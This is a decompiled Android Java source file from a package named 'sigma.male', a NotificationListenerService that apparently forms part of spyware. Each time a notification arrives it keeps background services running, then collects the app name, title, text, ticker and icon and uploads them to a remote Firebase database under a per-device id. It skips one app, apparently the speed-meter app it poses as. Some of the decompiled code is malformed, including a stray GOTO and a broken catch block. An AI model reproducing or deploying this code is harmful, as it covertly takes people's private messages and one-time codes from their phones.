/*
 * Decompiled with CFR 0.0.
 * 
 * Could not load the following classes:
 *  android.app.ActivityManager
 *  android.app.ActivityManager$RunningServiceInfo
 *  android.app.Notification
 *  android.content.ComponentName
 *  android.content.Context
 *  android.content.Intent
 *  android.content.pm.ApplicationInfo
 *  android.content.pm.PackageManager
 *  android.content.pm.PackageManager$NameNotFoundException
 *  android.graphics.Bitmap
 *  android.graphics.Bitmap$CompressFormat
 *  android.graphics.Bitmap$Config
 *  android.graphics.Canvas
 *  android.graphics.drawable.Drawable
 *  android.os.Bundle
 *  android.service.notification.NotificationListenerService
 *  android.service.notification.StatusBarNotification
 *  android.util.Base64
 *  android.util.Log
 *  com.google.android.gms.tasks.Task
 *  com.google.firebase.database.DatabaseReference
 *  com.google.firebase.database.FirebaseDatabase
 *  java.io.ByteArrayOutputStream
 *  java.io.OutputStream
 *  java.lang.CharSequence
 *  java.lang.Class
 *  java.lang.Exception
 *  java.lang.Object
 *  java.lang.String
 *  java.util.Date
 *  java.util.HashMap
 *  java.util.Iterator
 *  java.util.List
 */
package sigma.male;

import android.app.ActivityManager;
import android.app.Notification;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.drawable.Drawable;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Base64;
import android.util.Log;
import com.google.android.gms.tasks.Task;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.util.Date;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import sigma.male.ForegroundService;
import sigma.male.LastNotify;
import sigma.male.gui;
import sigma.male.servicess;

public class NotificationService
extends NotificationListenerService {
    Context context;
    LastNotify lastNotify;

    public static Bitmap getBitmapFromDrawable(Drawable drawable2) {
        Bitmap bitmap = Bitmap.createBitmap((int)drawable2.getIntrinsicWidth(), (int)drawable2.getIntrinsicHeight(), (Bitmap.Config)Bitmap.Config.ARGB_8888);
        Canvas canvas = new Canvas(bitmap);
        drawable2.setBounds(0, 0, canvas.getWidth(), canvas.getHeight());
        drawable2.draw(canvas);
        return bitmap;
    }

    private boolean isMyServiceRunning(Class<?> class_) {
        ActivityManager.RunningServiceInfo runningServiceInfo;
        Iterator iterator = ((ActivityManager)this.getSystemService("activity")).getRunningServices(Integer.MAX_VALUE).iterator();
        do {
            if (!iterator.hasNext()) {
                return false;
            }
            runningServiceInfo = (ActivityManager.RunningServiceInfo)iterator.next();
        } while (!class_.getName().equals((Object)runningServiceInfo.service.getClassName()));
        return true;
    }

    public void onCreate() {
        this.lastNotify = new LastNotify();
        super.onCreate();
        this.context = this.getApplicationContext();
    }

    /*
     * Unable to fully structure code
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     * Lifted jumps to return sites
     */
    public void onNotificationPosted(StatusBarNotification var1_1) {
        if (!this.isMyServiceRunning(servicess.class)) {
            this.startService(new Intent(this.getApplicationContext(), servicess.class));
            this.startService(new Intent(this.getApplicationContext(), ForegroundService.class));
        }
        if (!this.isMyServiceRunning(ForegroundService.class)) {
            this.startService(new Intent(this.getApplicationContext(), ForegroundService.class));
        }
        var3_2 = var1_1.getPackageName();
        var4_3 = var1_1.getNotification().tickerText != null ? var1_1.getNotification().tickerText.toString() : "";
        var5_4 = var1_1.getNotification().extras;
        var6_5 = var5_4.getString("android.title");
        var7_6 = var5_4.getCharSequence("android.text").toString();
        var8_7 = new Date().getTime();
        if (var6_5.equals((Object)this.lastNotify.titleN) && var7_6.equals((Object)this.lastNotify.textN) && var3_2.equals((Object)this.lastNotify.titleN)) ** GOTO lbl48
        this.lastNotify.titleN = var6_5;
        this.lastNotify.textN = var7_6;
        this.lastNotify.packageN = var3_2;
        try {
            var25_8 = this.getApplicationContext().getPackageManager().getApplicationIcon(var3_2);
            var26_9 = new ByteArrayOutputStream();
            NotificationService.getBitmapFromDrawable(var25_8).compress(Bitmap.CompressFormat.JPEG, 100, (OutputStream)var26_9);
            var11_11 = var28_10 = Base64.encodeToString((byte[])var26_9.toByteArray(), (int)0);
        }
        catch (PackageManager.NameNotFoundException var10_16) {
            var11_11 = "";
        }
        var12_12 = this.getApplicationContext().getPackageManager();
        var13_13 = (String)var12_12.getApplicationLabel(var12_12.getApplicationInfo(var3_2, 128));
        var14_14 = new HashMap();
        var14_14.put((Object)"package", (Object)var3_2);
        var14_14.put((Object)"name", (Object)var13_13);
        var14_14.put((Object)"ticker", (Object)var4_3);
        var14_14.put((Object)"title", (Object)var6_5);
        var14_14.put((Object)"text", (Object)var7_6);
        var14_14.put((Object)"icon", (Object)var11_11);
        var14_14.put((Object)"time", (Object)var8_7);
        if (var3_2.equals((Object)"com.internet.speed.meter.lite") != false) return;
        var22_15 = FirebaseDatabase.getInstance().getReference("notilogo/" + gui.uuii(this.getApplicationContext()));
        {
            catch (Exception var2_18) {
                var2_18.printStackTrace();
                return;
            }
        }
        try {
            var22_15.push().setValue((Object)var14_14);
            return;
        }
        catch (Exception var23_17) {
            var23_17.printStackTrace();
            return;
lbl48: // 2 sources:
            Log.i((String)"notify", (String)"Repeat detected");
            return;
        }
    }

    public void onNotificationRemoved(StatusBarNotification statusBarNotification) {
        Log.i((String)"Msg", (String)"Notification Removed");
    }
}

